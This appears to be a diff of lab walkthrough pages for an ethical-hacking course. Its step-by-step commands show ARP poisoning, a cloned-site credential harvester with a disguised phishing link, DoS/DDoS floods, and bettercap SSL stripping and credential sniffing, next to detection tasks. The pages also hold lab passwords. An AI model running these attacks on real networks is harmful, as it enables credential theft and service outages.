+# Activation wizard: paste serial in Serial Number field
+#   Ensure &quot;Activate online (Recommended)&quot; selected -&gt; Next
+# Success -&gt; Finish
+# Analysis Project 1: check checkbox beside available adapter (Ethernet) -&gt; Start
+# Diagnosis tab
+
+# Parrot Security - ARP poisoning with Habu
+sudo su
+# password: toor
+cd
+habu.arp.poison 10.10.1.11 10.10.1.13
+# sends ARP &#x27;is-at&#x27; packets to specified victim(s), poisoning their ARP tables
+# ignore errors if any
+
+# Capsa detection (Windows 11)
+# Diagnosis tab -&gt; expand Data Link Layer -&gt; &quot;ARP Too Many Unrequested Replies&quot; (~10 min)
+# Click &quot;ARP Too Many Unrequested Replies&quot; warning
+# Right-click any Security warning under Details -&gt; Resolve Address... -&gt; OK
+# All Diagnosis (Events section) -&gt; select Parrot IP 10.10.1.13 -&gt; double-click
+# Packet tab -&gt; check packets transferred by Parrot machine
+# Analysis Settings (N) menu -&gt; Diagnosis -&gt; check Diagnosis node
+#   Log -&gt; Save log to disk -&gt; ellipsis -&gt; Desktop -&gt; Select Folder
+#   CSV file selected; Split file every 1 minute -&gt; OK
+# Observe csv log in Desktop/log_diagnosis
+</code></pre>            </div></section>            <section class="lab-task"><h3>Module 09 — Social Engineering</h3><div class="section-card">                <p><strong>Sniff Credentials using the Social-Engineer Toolkit (SET)</strong> <span class="tool-tag">Social-Engineer Toolkit (SET) / Firefox / Gmail</span></p>                <pre><code># Parrot Security - become root
+sudo su
+# password: toor (not visible while typing)
+cd
+# navigate to the SET folder
+cd social-engineer-toolkit
+# launch Social-Engineer Toolkit
+./setoolkit
+# if &quot;Do you agree to the terms of service [y/n]&quot; appears: y
+# SET interactive menu choices:
+#   1 -&gt; Social-Engineering Attacks
+#   2 -&gt; Website Attack Vectors
+#   3 -&gt; Credential Harvester Attack Method
+#   2 -&gt; Site Cloner
+# IP address for the POST back in Harvester/Tabnabbing: 10.10.1.13
+# Enter the url to clone: http://www.moviescope.com
+# If &quot;Press {return} if you understand what we&#x27;re saying here&quot;: press Enter
+# (credential harvester initiates)
+
+# Phishing email (Gmail) - disguise malicious link
+# Firefox -&gt; log in to email (Gmail) -&gt; Compose
+# Position cursor just above &quot;Regards&quot;; click Insert link icon
+# Edit Link: Web address (actual) = http://10.10.1.13 ; Text to display (fake) = http://www.moviescope.com/avail_benefits
+# Verify link (Go to link pop-up) -&gt; send email to intended user
+
+# Victim (Windows 11)
+# Open browser (Firefox) -&gt; sign in to email account -&gt; open phishing email -&gt; click malicious link
+# Enter Username and Password -&gt; Login (redirected to legitimate MovieScope page)
+# If save credentials notification appears: Don&#x27;t Save
+
+# Attacker (Parrot Security)
+# Terminal shows harvested Username and Password in plain text
+</code></pre>                <p><strong>Detect Phishing using Netcraft</strong> <span class="tool-tag">Netcraft Browser Extension / Firefox</span></p>                <pre><code># Windows 11 browser (Firefox)
+https://www.netcraft.com/apps-extensions/browser-extension/
+# scroll to &quot;Download the extension today&quot; -&gt; click Firefox browser icon
+# Add to Firefox -&gt; Add
+# If &quot;Netcraft Extension request additional permissions&quot; pop-up: Allow
+# If asked to restart browser: Restart Now
+# If extension icon missing: Extensions icon -&gt; Settings -&gt; Pin to toolbar
+
+# Inspect a legitimate site
+http://www.certifiedhacker.com/
+# Click Netcraft Extension icon -&gt; Site Report link
+# (Risk Rating, Site rank, First seen, Host; Background, Network, IP Geolocation, SSL/TLS, Hosting History)
+
+# Trigger phishing detection
+https://smbc.ctad-co.com/m
+# Netcraft blocks phishing site -&gt; &quot;Suspected Phishing&quot; page
+# Options: Visit anyway / Report mistake
+# If site fails to open, try another phishing website
+</code></pre>                <p><strong>Detect Phishing using PhishTank</strong> <span class="tool-tag">PhishTank</span></p>                <pre><code># Windows 11 browser (Firefox)
+https://www.phishtank.com
+# Browse Recent Submissions -&gt; click a phishing website ID (e.g. 7486626) -&gt; view details (&quot;Is a phish&quot;)
+# If &quot;Would you like Firefox to save this login?&quot;: Don&#x27;t Save
+# If captcha appears: enter captcha to proceed
+
+# Check an arbitrary URL
+# Found a phishing site? field: be-ride.ru/confirm -&gt; &quot;Is it a phish?&quot;
+# Result: &quot;Is a phish&quot; (if phishing)
+</code></pre>                <p><strong>Audit Organization&#x27;s Security for Phishing Attacks using OhPhish</strong> <span class="tool-tag">OhPhish (EC-Council Aware) / Firefox</span></p>                <pre><code># Windows 11 browser (Firefox) - activate OhPhish via ASPEN
+# Log in to ASPEN -&gt; CEH v12 (My Courses) -&gt; click &quot;Click here&quot; (OhPhish notification)
+# OhPhish Sign Up: enter personal details, check I&#x27;m not a robot -&gt; Complete Signup -&gt; OK
+# Email from OhPhish -&gt; click CLICK HERE TO LOGIN
+# EC-Council Aware: Username (email) -&gt; Next; Password -&gt; Sign In
+# If &quot;Save login for ohphish.com?&quot;: Don&#x27;t Save
+# Reset Password: new password in both fields -&gt; Reset Password
+# Login: https://portal.ohphish.com/login (or via ASPEN &quot;LOGIN TO OHPHISH PORTAL&quot;)
+
+# Campaign 1 - Entice to Click
+# Dashboard -&gt; Entice to Click
+# Campaign Name: Test - Entice to Click
+# Select Template Category: Coronavirus/COVID-19
+# Email Template: Existing Template
+# Select Country: All (default)
+# Select Template: Work From Home: COVID-19 -&gt; Select
+# Import users -&gt; Select Source -&gt; Quick Add -&gt; enter employee details -&gt; Add -&gt; Import
+# Batch Count: 1 ; Batch Interval: 1
+# Landing Page: default
+# Create -&gt; Add to Whitelist: Done -&gt; Confirm: SURE
+# (10s countdown -&gt; Alert OK)
+
+# Victim (Windows Server 2019)
+# Open Gmail -&gt; search &quot;WFH Under Organizational Policy&quot; -&gt; click WFH - Policy.pdf link
+# &quot;Warning - phishing suspected&quot; page appears -&gt; close tab
+
+# Dashboard: click &quot;Test - Entice to Click&quot; campaign -&gt; Campaign Detailed Report
+# Campaign Summary: No. of targets who clicked the link = 1
+# Home
+
+# Campaign 2 - Send Attachment
+# Dashboard -&gt; Send Attachment
+# Campaign Name: Test - Send to Attachment
+# Select Template Category: Office Mailers
+# Select Template: PF Amount Credited -&gt; Select
+# Attachment name: PFinfo
+# Import users (Quick Add) -&gt; Import
+# Batch Count: 1 ; Batch Interval: 1
+# Create -&gt; Done -&gt; SURE
+# (10s countdown -&gt; Alert OK)
+
+# Victim (Windows Server 2019)
+# Gmail Inbox -&gt; email from HR - ABP News -&gt; click &quot;EPF - KYC Documents Upload Centre&quot;
+# If Suspicious link pop-up: Proceed -&gt; &quot;Oh You&#x27;ve been Phished&quot; landing page
+
+# Dashboard: click &quot;Test - Send to Attachment&quot; campaign -&gt; Campaigns Users (defaulter details)
+# Reports -&gt; Executive Summary Report -&gt; select campaign -&gt; Export -&gt; Save File -&gt; open Phishing-Simulation-Test file
+</code></pre>            </div></section>            <section class="lab-task"><h3>Module 10 — Denial-of-Service</h3><div class="section-card">                <p><strong>Perform a DoS Attack (SYN Flooding) on a Target Host using Metasploit</strong> <span class="tool-tag">Metasploit (msfconsole) / Nmap / Wireshark</span></p>                <pre><code># Parrot Security - become root
+sudo su
+# password: toor (not visible while typing)
+cd
+# confirm target port 21 is open
+nmap -p 21 10.10.1.11
+# -p: specifies the port to be scanned
+# launch Metasploit console
+msfconsole
+# inside msfconsole
+use auxiliary/dos/tcp/synflood
+show options
+# configure module options
+set RHOST 10.10.1.11
+set RPORT 21
+set SHOST 10.10.1.19
+# SHOST spoofs the Parrot Security IP with that of Windows Server 2019
+# start the DoS attack
+exploit
+# stop the attack
+# Ctrl+C
+
+# Windows 11 - capture/observe traffic
+# search: wireshark -&gt; Open
+# double-click primary network interface (Ethernet) to capture
+# observe Source IP 10.10.1.19 (spoofed) and slowed performance
+</code></pre>                <p><strong>Perform a DoS Attack on a Target Host using hping3</strong> <span class="tool-tag">hping3 / Nmap / Wireshark</span></p>                <pre><code># Windows 11 - start capture
+# search: wireshark -&gt; Open; double-click primary interface (Ethernet)
+# leave capturing
+
+# Parrot Security - become root
+sudo su
+# password: toor
+cd
+# SYN flooding (spoofed source)
+hping3 -S 10.10.1.11 -a 10.10.1.19 -p 22 --flood
+# -S: sets SYN flag; -a: spoofs IP; -p: destination port; --flood: huge number of packets
+# stop after a few seconds
+# Ctrl+C
+
+# observe on Windows 11
+# Wireshark -&gt; Statistics -&gt; I/O Graph -&gt; observe huge TCP packet count -&gt; Close
+
+# Ping of Death (PoD)
+hping3 -d 65538 -S -p 21 --flood 10.10.1.11
+# -d: data size; -S: SYN flag; -p: destination port; --flood: huge number of packets
+# RFC 791 IP max is 65,535 bytes; 65,538 exceeds it
+# Ctrl+C to stop
+
+# Windows 11 - capture PoD traffic in Wireshark (optional re-capture)
+
+# UDP application layer flood on Windows Server 2019 (port 139)
+# confirm port 139 open
+nmap -p 139 10.10.1.19
+hping3 -2 -p 139 --flood 10.10.1.19
+# -2: UDP mode; -p: destination port; --flood: huge number of packets
+# Ctrl+C to stop
+
+# Windows Server 2019 - capture traffic
+# search: wireshark -&gt; Open; double-click primary interface (Ethernet 2)
+# observe huge UDP packets from 10.10.1.13 via port 139
+</code></pre>                <p><strong>Perform a DoS Attack using Raven-Storm</strong> <span class="tool-tag">Raven-Storm (rst) / Wireshark</span></p>                <pre><code># Parrot Security - become root
+sudo su
+# password: toor
+# launch Raven-Storm
+sudo rst
+# interactive prompts
+l4
+# load layer4 module (UDP/TCP)
+ip 10.10.1.19
+# target IP (Windows Server 2019)
+port 80
+# target port
+threads 20000
+# number of threads
+run
+# start DoS attack
+# &quot;Do you agree to the terms of use? (Y/N)&quot;: Y
+# stop attack
+# Ctrl+Z
+
+# Windows Server 2019 - capture traffic
+# search: wireshark -&gt; Open (or Applications -&gt; Pentesting -&gt; Information Gathering -&gt; wireshark)
+# password: toor -&gt; OK
+# double-click primary interface (Ethernet 2)
+</code></pre>                <p><strong>Perform a DDoS Attack using HOIC</strong> <span class="tool-tag">HOIC (hoic2.1.exe) / Wireshark</span></p>                <pre><code># Parrot Security - capture traffic
+# Applications -&gt; Pentesting -&gt; Information Gathering -&gt; wireshark
+# password: toor -&gt; OK
+# double-click primary interface (eth0)
+
+# Windows 11 (and Server 2019/2022) - copy tool
+# navigate to E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools
+# copy &quot;High Orbit Ion Cannon (HOIC)&quot; folder to Desktop
+# (Server 2019/2022: Z:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools)
+
+# launch HOIC
+# Desktop -&gt; High Orbit Ion Cannon (HOIC) -&gt; double-click hoic2.1.exe
+# if Open File - Security Warning: Run
+
+# configure target
+# click &quot;+&quot; below TARGETS
+# URL: http://10.10.1.13   (Parrot Security)
+# slide Power bar to High
+# Booster: GenericBoost.hoic
+# click Add
+# set THREADS to 20 (click &quot;&gt;&quot; until 20)
+# repeat configuration on Windows Server 2019 and 2022
+
+# fire
+# on each attacker machine click &quot;FIRE TEH LAZER!&quot;
+# Status changes from READY to ENGAGING
+
+# Parrot Security - observe Wireshark capturing large volume from 11/19/22
+# performance slightly affected
+
+# stop
+# click &quot;FIRE TEH LAZER!&quot; again on each attacker; close HOIC
+# close Wireshark on Parrot Security
+</code></pre>                <p><strong>Perform a DDoS Attack using LOIC</strong> <span class="tool-tag">LOIC (LOIC.exe) / Wireshark</span></p>                <pre><code># Windows 11 - launch LOIC
+# navigate to E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\Low Orbit Ion Cannon (LOIC)
+# double-click LOIC.exe ; if Open File - Security Warning: Run
+
+# configure
+# Select your target: IP = 10.10.1.13 ; click Lock on
+# Attack options: Method = UDP; Threads = 10; slide power bar to middle
+
+# Windows Server 2019 and 2022 - launch + configure (same, LOIC at Z:\...)
+# Server 2019: Ctrl+Alt+Delete, Administrator, Pa$$w0rd
+# Server 2022: CEH\Administrator, Pa$$w0rd
+
+# fire on each attacker
+# click &quot;IMMA CHARGIN MAH LAZER&quot; under Ready?
+
+# Parrot Security - capture
+# Applications -&gt; Pentesting -&gt; Information Gathering -&gt; wireshark
+# password toor -&gt; OK; double-click eth0
+# observe large volume from 11/19/22; leave 5-10 minutes; performance slows
+
+# stop
+# click &quot;Stop flooding&quot; on each attacker; close LOIC
+</code></pre>                <p><strong>Detect and Protect Against DDoS Attacks using Anti DDoS Guardian</strong> <span class="tool-tag">Anti DDoS Guardian / LOIC / Wireshark</span></p>                <pre><code># Windows 11 - install Anti DDoS Guardian
+# navigate to E:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Protection Tools\Anti DDoS Guardian
+# double-click Anti_DDoS_Guardian_setup.exe
+# User Account Control: Yes ; Open File - Security Warning: Run
+# Setup wizard: Next; uncheck &quot;install Stop RDP Brute Force&quot;; Next
+# check &quot;Create a desktop shortcut&quot;; Next
+# Ready to Install: Install
+# Completing: uncheck &quot;Launch Mini IP Blocker&quot;; Finish
+# Anti-DDoS Wizard: Continue through all steps (defaults); Finish
+# Show hidden icons (bottom-right) -&gt; click Anti DDoS Guardian icon
+# window shows incoming/outgoing traffic
+
+# Windows Server 2019 - launch LOIC (attacker)
+# log in: Ctrl+Alt+Delete, Administrator, Pa$$w0rd
+# navigate Z:\CEH-Tools\CEHv12 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\Low Orbit Ion Cannon (LOIC)
+# double-click LOIC.exe ; if Open File - Security Warning: Run
+# Select your target: IP = 10.10.1.11 ; Lock on
+# Attack options: Method = UDP; Threads = 5; power bar middle
+
+# Windows Server 2022 - same (Steps 11-13)
+
+# fire
+# on Server 2019 and 2022 click &quot;IMMA CHARGIN MAH LAZER&quot;
+
+# Windows 11 - detect and block
+# Anti DDoS Guardian shows huge packets from 10.10.1.19 and 10.10.1.22
+# double-click a session (e.g. 10.10.1.22) -&gt; Traffic Detail Viewer (raw data)
+# observe high incoming bytes from Remote IP
+# left pane: click Block IP -&gt; session turns red in Action Taken
+# similarly Block IP for 10.10.1.19
+
+# stop
+# click Stop flooding on Server 2019 and 2022; close LOIC
+
+# cleanup
+# Windows 11: Control Panel -&gt; Programs -&gt; Programs and Features -&gt; uninstall Anti DDoS Guardian
+</code></pre>            </div></section>            <section class="lab-task"><h3>Module 11 — Session Hijacking</h3><div class="section-card">                <p><strong>Hijack a Session using Zed Attack Proxy (ZAP)</strong> <span class="tool-tag">Zed Attack Proxy (ZAP 2.11.1) / Google Chrome</span></p>                <pre><code># Victim machine: Windows 11 (proxy configuration)
+# Chrome -&gt; Customize and control Google Chrome -&gt; Settings
+# Settings -&gt; Advanced -&gt; System -&gt; &quot;Open your computer&#x27;s proxy settings&quot;
+# Settings (Windows) -&gt; Proxy -&gt; Manual proxy setup -&gt; Edit
+# Use a proxy server: Off -&gt; On
+Proxy IP address: 10.10.1.19   # attacker machine (Windows Server 2019)
+Port: 8080
+# Save; close Settings and browser windows
+
+# Attacker machine: Windows Server 2019 (ZAP as proxy)
+# Search &quot;zap&quot; -&gt; ZAP 2.11.1 -&gt; Enter
+# &quot;Do you want to persist the ZAP Session?&quot; -&gt; &quot;No, I do not want to persist this session...&quot; -&gt; Start
+# &quot;+&quot; icon (right pane) -&gt; Break   (Break tab added; modify request/response in real time)
+# Options icon (toolbar) -&gt; Local Proxies
+Address: 10.10.1.19   # Windows Server 2019 IP
+Port: 8080            # default
+# OK
+# &quot;Set break on all requests and responses&quot; icon -&gt; turns green to red (global breakpoint)
+
+# Victim browser (Windows 11)
+# address bar: www.moviescope.com -&gt; Enter
+# &quot;Your connection is not private&quot; -&gt; Advanced -&gt; &quot;Proceed to www.moviescope.com (unsafe)&quot;
+
+# Attacker ZAP (Windows Server 2019) - manipulate traffic
+# Break tab -&gt; &quot;Submit and step to next request or response&quot; (capture request)
+# Break tab -&gt; &quot;Submit and step to next request or response&quot; (capture response)
+# modify www.moviescope.com -&gt; www.goodshopping.com in all captured GET requests
+# (any https URL -&gt; http)
+# &quot;Submit and step to next request or response&quot; to forward traffic
+# submit HTTP Not Found requests
+# repeat until www.goodshopping.com renders on victim while address bar shows www.moviescope.com
+
+# Revert proxy on victim (Windows 11): Manual proxy setup -&gt; On -&gt; Off -&gt; Save
+</code></pre>                <p><strong>Intercept HTTP Traffic using bettercap</strong> <span class="tool-tag">bettercap / Mozilla Firefox</span></p>                <pre><code># Parrot Security - become root
+sudo su
+# password: toor (not visible while typing)
+cd
+
+# inspect bettercap options
+bettercap -h
+# -h: requests a list of available options
+
+# bind to network interface
+bettercap -iface eth0
+# -iface: specifies the interface to bind to (eth0)
+
+# inside bettercap interactive console
+help                          # view available modules
+net.probe on                  # send probe packets to each IP in subnet for net.recon
+net.recon on                  # read ARP table to detect hosts; starts sniffing
+set http.proxy.sslstrip true  # enable SSL stripping
+set arp.spoof.internal true   # spoof local connections among internal computers
+set arp.spoof.targets 10.10.1.11   # spoof target host IP (Windows 11)
+http.proxy on                 # initiate HTTP proxy
+arp.spoof on                  # initiate ARP spoofing
+net.sniff on                  # perform network sniffing
+set net.sniff.regexp &#x27;.*password=.+&#x27;   # only packets whose payload matches regex
+
+# victim browses http://www.moviescope.com and logs in as sam/test
+# observe sniffed site + credentials in plaintext in bettercap console
+
+# stop
+# Ctrl+C
+# &quot;Are you sure you want to quit this session? (Y/N)&quot; -&gt; y -&gt; Enter
+</code></pre>                <p><strong>Intercept HTTP Traffic using Hetty</strong> <span class="tool-tag">Hetty / Google Chrome / Mozilla Firefox</span></p>                <pre><code># Attacker machine: Windows 11
+# navigate to E:\CEH-Tools\CEHv12 Module 11 Session Hijacking\Hetty
+# double-click hetty.exe
+# Open File - Security Warning -&gt; Run
+# Command Prompt appears; Hetty initializes
+# minimize windows; launch browser (Mozilla Firefox)
+# address bar: http://localhost:8080 -&gt; Enter (Hetty dashboard)
+# Hetty dashboard -&gt; &quot;MANAGE PROJECTS&quot;
+# New Project: Project name = Moviescope -&gt; &quot;+ CREATE &amp; OPEN PROJECT&quot;
+# project &quot;Moviescope&quot; created, status Active
+# click Proxy logs icon (left pane) -&gt; Proxy logs page
+
+# Victim machine: Windows Server 2022 (proxy configuration)
+# Ctrl+Alt+Delete -&gt; CEH\Administrator -&gt; Pa$$w0rd -&gt; Enter
+# Networks screen -&gt; Yes
+# Chrome -&gt; Customize and control Google Chrome -&gt; Settings
+# Settings -&gt; Advanced -&gt; System -&gt; &quot;Open your computer&#x27;s proxy settings&quot;
+# Manual proxy setup section:
+# Use a proxy server: Off -&gt; On
+Address: 10.10.1.11   # attacker (Windows 11) IP
+Port: 8080
+# Save; close Settings and browser
+
+# Victim browser (Windows Server 2022)
+# new tab -&gt; http://www.moviescope.com -&gt; Enter
+# log in as victim: sam/test
+
+# Attacker Hetty dashboard (Windows 11)
+# Proxy logs page -&gt; scroll to moviescope.com logs
+# find POST request for the target website
+# select the POST request -&gt; lower section -&gt; Body tab (under POST)
+# Body tab shows captured user credentials in plaintext
+
+# Revert proxy on victim (Windows Server 2022): Manual proxy setup -&gt; On -&gt; Off -&gt; Save
+</code></pre>                <p><strong>Detect Session Hijacking using Wireshark</strong> <span class="tool-tag">Wireshark / bettercap (Parrot Security 10.10.1.13)</span></p>                <pre><code># Victim machine: Windows 11 (capture traffic)
+# Search &quot;wire&quot; -&gt; Wireshark -&gt; Open
+# Wireshark Network Analyzer -&gt; double-click primary interface (Ethernet)
+# capturing network traffic; leave running
+
+# Attacker machine: Parrot Security (launch session hijacking via bettercap)
+sudo su
+# password: toor (not visible)
+cd
+bettercap -iface eth0
+# -iface: interface to bind to (eth0)
+net.probe on       # send probe packets to each IP in subnet
+net.recon on       # read ARP table; detect hosts; start sniffing
+net.sniff on       # sniff network traffic
+
+# Victim Wireshark: observe huge number of ARP packets
+# high ARP broadcast count =&gt; 10.10.1.13 acts as client for all subnet IPs (MITM)
+
+# stop bettercap
+# Ctrl+C
+</code></pre>            </div></section>            <section class="lab-task"><h3>Module 12 — Evading IDS, Firewalls, and Honeypots</h3><div class="section-card">                <p><strong>Detect Intrusions using Snort</strong> <span class="tool-tag">Snort 2.9.15 / Windows Server 2019 / Windows 11 / Notepad++ / cmd / WinPcap</span></p>                <pre><code># IDS machine: Windows Server 2019
+# Install Snort from Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort
+# double-click Snort_2_9_15_Installer.exe (Run if Open File - Security Warning)
+# Accept License Agreement; select default options; click Close; click OK to exit installer
+# Snort installs to C:\Snort (C:\ or D:\ depending on OS drive)
+# WinPcap drivers already installed in this environment
+
+# Copy Snort rules snapshot into C:\Snort
+# copy ...\snortrules-snapshot-29150\etc\snort.conf -&gt; C:\Snort\etc (replace existing)
+# copy ...\so_rules folder -&gt; C:\Snort (replace)
+# copy ...\preproc_rules folder -&gt; C:\Snort (replace)
+# copy ...\rules folder -&gt; C:\Snort (replace)
+
+# Verify Snort and enable the Ethernet driver
+# Start -&gt; Run -&gt; cmd -&gt; OK
+cd C:\Snort\bin
+snort
+# Snort initializes; after completion press Ctrl+C to return to C:\Snort\bin
+snort -W
+# lists physical address, IP address and Ethernet drivers (disabled by default)
+# note your Ethernet driver index number (here: 1)
+snort -dev -i 1
+# enables interface index 1; rapid scrolling text confirms capture
+# leave this Snort window open; open a second command prompt
+ping google.com
+# triggers a Snort alert (ICMP echo) in the first window; Google IP varies
+
+# Configure C:\Snort\etc\snort.conf in Notepad++
+# Step #1 network variables (line ~45): HOME_NET = 10.10.1.19 (Snort host IP)
+# EXTERNAL_NET any (unchanged); DNS_SERVERS = 8.8.8.8 if a DNS server exists
+# SMTP/HTTP/SQL/TELNET/SSH_SERVERS: leave default if no servers run
+# Step #2 RULE_PATH (lines ~104-110): replace ../rules -&gt; C:\Snort\rules
+#   ../so_rules -&gt; C:\Snort\so_rules ; ../preproc_rules -&gt; C:\Snort\preproc_rules
+# Create C:\Snort\rules\white_list.rules and black_list.rules (empty text files)
+# Step #4 dynamic loaded libraries (lines ~238-250):
+#   dynamic preprocessor libs -&gt; C:\Snort\lib\snort_dynamicpreprocessor
+#   base engine -&gt; C:\Snort\lib\snort_dynamicengine\sf_engine.dll
+#   comment out the dynamic rules libraries line (add space after #)
+# Step #5 preprocessors (lines ~253-266): comment out all listed preprocessors
+# line 326: delete the &#x27;lzma&#x27; keyword and a space
+# Step #6 output plugins (lines ~513-534): classification.config/reference.config
+#   -&gt; C:\Snort\etc\classification.config and C:\Snort\etc\reference.config
+#   add: output alert_fast: alerts.ids
+# Find/Replace ipvar -&gt; var (11 occurrences); Save (Ctrl+S); close Notepad++
+
+# Enable ICMP detection rule
+# C:\Snort\rules\icmp-info.rules line 21:
+# alert icmp $EXTERNAL_NET any -&gt; $HOME_NET 10.10.1.19 (msg:&quot;ICMP-INFO PING&quot;; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;)
+
+# Start Snort in IDS mode (X = interface index, here 1)
+cd C:\Snort\bin
+snort -i1 -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii
+# wait for &quot;Commencing packet processing (pid=xxxx)&quot;; leave running
+
+# Attacker machine: Windows 11
+# Open cmd; ping the Snort host
+ping 10.10.1.19 -t
+# 10.10.1.19 = Windows Server 2019 (Snort); IP may vary
+# Snort host: observe alarm triggered; press Ctrl+C to stop Snort
+# Inspect logs: C:\Snort\log\10.10.1.11\ICMP_ECHO.ids (folder = attacker IP)
+</code></pre>                <p><strong>Detect Malicious Network Traffic using ZoneAlarm FREE FIREWALL</strong> <span class="tool-tag">ZoneAlarm FREE FIREWALL / Google Chrome / Windows 11 / Windows Server 2019</span></p>                <pre><code># Victim machine: Windows 11
+# Browse http://www.moviescope.com (allowed before firewall) -&gt; close Chrome
+
+# Install ZoneAlarm
+# navigate to Z:\CEHv12 Module 12 ...\Firewalls\ZoneAlarm FREE FIREWALL
+# double-click zafwSetupWeb_158_189_19019.exe
+# UAC: Yes
+# check &quot;By clicking here, you accept the terms of the Privacy Policy&quot;; Custom Install
+# EULA: Agree &gt;
+# Application Control Mode: AUTO-LEARN; Next &gt;
+# Chrome extension wizard: Skip (or Add to Chrome)
+# wait for download/configure; Installation Successful -&gt; FINISH
+# close the ZoneAlarm webpage that opens
+
+# Configure blocking rule
+# ZoneAlarm main window -&gt; FIREWALL button
+# FIREWALL tab -&gt; View Zones (Basic Firewall)
+# Add &gt;&gt; -&gt; Host/Site
+# Zone: Blocked
+# Hostname: www.moviescope.com
+# Description: Block This Site
+# Lookup -&gt; IP appears -&gt; OK
+# newly added rule appears -&gt; OK
+
+# Verify block
+# open browser -&gt; browse www.moviescope.com -&gt; &quot;Your Internet access is blocked&quot;
+
+# Revert and cleanup
+# Firewall Settings -&gt; select new rule in View Zones -&gt; Remove -&gt; OK (Yes if Delete Confirmation)
+# close ZoneAlarm main window
+# Show hidden icons (lower right) -&gt; right-click ZoneAlarm icon -&gt; Exit (Yes if Shut down prompt)
+# Restart Windows 11; login Admin / Pa$$w0rd
+# Uninstall: Control Panel -&gt; Programs -&gt; Programs and Features
+#   select ZoneAlarm Free Firewall -&gt; Uninstall; follow wizard; restart when prompted
+# Turn off Windows Defender Firewall:
+#   Windows Defender Firewall -&gt; &quot;Turn Windows Defender Firewall on or off&quot;
+#   select &quot;Turn off Windows Defender Firewall (not recommended)&quot; for Domain/Private/Public -&gt; OK
+#   Advanced settings -&gt; Windows Defender Firewall Properties (Overview)
+#   Domain/Private/Public Profile: Firewall state = Off -&gt; Apply -&gt; OK
+# close all windows
+</code></pre>                <p><strong>Detect Malicious Network Traffic using HoneyBOT</strong> <span class="tool-tag">HoneyBOT / Windows Server 2022 / Parrot Security (telnet) / Windows Server 2019</span></p>                <pre><code># Honeypot host: Windows Server 2022
+# Login CEH\Administrator / Pa$$w0rd; Networks screen -&gt; Yes
+# Install HoneyBOT from Z:\CEHv12 Module 12 ...\Honeypot Tools\HoneyBOT
+# double-click HoneyBOT_018.exe; UAC Yes; follow wizard
+# at &quot;Completing the HoneyBot Setup Wizard&quot;: uncheck Launch HoneyBOT; Finish
+# Start -&gt; Recently added -&gt; HoneyBOT -&gt; More -&gt; Run as administrator
+# HoneyBOT configuration pop-up -&gt; Yes
+# HoneyBOT Options:
+#   General: leave defaults
+#   Email Alert: optional (none in this task)
+#   Exports: Export Logs to CSV + Upload Logs to Server (selected)
+#   Updates: uncheck Check for Updates -&gt; Apply -&gt; OK (OK on Bindings pop-up)
+# leave HoneyBOT running
+
+# Attacker: Parrot Security
+sudo su
+# password: toor (not visible)
+cd
+telnet 10.10.1.22
+# 10.10.1.22 = Windows Server 2022 IP; may vary
+# prompted for telnet credentials of Windows Server 2022
+
+# Honeypot host: Windows Server 2022
+# HoneyBOT: expand Ports and Remotes (left pane)
+# Ports: port numbers from which the host received requests/attacks
+# Remotes: recorded source IP addresses
+# right-click any IP or Port -&gt; View Details -&gt; Packet Log
+# Connection Details: date/time, protocol, source IP, source port, server port
+# (optional) run ftp from Parrot Security and observe the log
+</code></pre>                <p><strong>Bypass Windows Firewall using Nmap Evasion Techniques</strong> <span class="tool-tag">Nmap / Windows Defender Firewall / Windows 11 / Parrot Security / Windows Server 2022</span></p>                <pre><code># Windows 11: enable firewall and block the attacker
+# Control Panel -&gt; System and Security -&gt; Windows Defender Firewall -&gt; &quot;Use recommended settings&quot;
+# Advanced settings (left pane)
+# Inbound Rules (left pane) -&gt; New Rule (Actions)
+# Rule Type: Custom -&gt; Next
+# Program: default -&gt; Next
+# Protocol and Ports: default -&gt; Next
+# Scope: &quot;These IP addresses&quot; under remote IPs -&gt; Add -&gt; 10.10.1.13 (Parrot) -&gt; OK -&gt; Next
+# Action: Block the connection -&gt; Next
+# Profile: default (all) -&gt; Next
+# Name: Block Parrot Security -&gt; Finish
+# close all windows
+
+# Parrot Security: scan through/around the firewall
+sudo su
+# password: toor (not visible)
+cd
+nmap 10.10.1.11
+# all 1,000 scanned ports filtered (firewall on)
+nmap -sS 10.10.1.11
+# TCP SYN scan; same filtered result
+nmap -T4 -A 10.10.1.11
+# -T4 aggressive timing; -A OS/version/script/traceroute; same result
+nmap -sP 10.10.1.0/24
+# ping sweep; discovers live machines (Windows Server 2019 10.10.1.19 active)
+nmap -sI 10.10.1.22 10.10.1.11
+# zombie/idle scan using 10.10.1.22 as zombie; reveals open ports/services
+# choose any live IP from the ping sweep as the zombie
+
+# Cleanup on Windows 11
+# Windows Defender Firewall with Advanced Security -&gt; Inbound Rules
+# delete &quot;Block Parrot Security&quot;
+# turn off Windows Defender Firewall for all profiles
+# close all windows
+</code></pre>                <p><strong>Bypass Firewall Rules using HTTP/FTP Tunneling</strong> <span class="tool-tag">HTTPort / HTTHost / Windows Defender Firewall / Windows Server 2019 / Windows Server 2022 / Windows 11 / ftp</span></p>                <pre><code># Endpoint host: Windows Server 2022 (HTTHost)
+# Ensure IIS Admin Service and World Wide Web Publishing Service are NOT running
+# Start -&gt; Windows Administrative Tools -&gt; Services
+# if World Wide Web Publishing Service is enabled: disable it (Startup type Disabled)
+# stop IIS Admin Service if running
+# navigate to Z:\CEHv12 Module 12 ...\HTTP Tunneling Tools\HTTHost
+# double-click htthost.exe (Run if security warning)
+# HTTHost wizard -&gt; Options tab:
+#   Port: 90 (default); other settings default
+#   Personal password: magic
+#   check Revalidate DNS names and Log connections -&gt; Apply
+# Application log: last line &quot;Listener: listening at 0.0.0.0:90&quot;
+# leave HTTHost running; do not turn off Windows Server 2022
+
+# Firewall host: Windows Server 2019 (outbound block + HTTPort)
+# Control Panel -&gt; System and Security -&gt; Windows Defender Firewall
+# Turn Windows Defender Firewall on or off -&gt; Turn on for Private + Public -&gt; OK
+# Advanced settings -&gt; Outbound Rules -&gt; New Rule...
+# Rule Type: Port -&gt; Next
+# Remote ports: All remote ports -&gt; Next
+# Action: Block the connection -&gt; Next
